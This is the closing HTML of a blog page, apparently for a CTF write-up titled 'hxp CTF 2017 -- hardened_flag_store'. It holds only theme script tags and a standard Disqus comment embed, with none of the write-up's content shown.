  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>



  


  

    
      <script id="dsq-count-scr" src="https://bruce30262logdown.disqus.com/count.js" async></script>
    

    
      <script type="text/javascript">
        var disqus_config = function () {
          this.page.url = 'https://bruce30262.github.io/2017/11/20/hxp-CTF-2017-hardened-flag-store/';
          this.page.identifier = '2017/11/20/hxp-CTF-2017-hardened-flag-store/';
          this.page.title = 'hxp CTF 2017 -- hardened_flag_store';
        };
        var d = document, s = d.createElement('script');
        s.src = 'https://bruce30262logdown.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      </script>
    

  













  





  

  

  

  

  

</body>
</html>
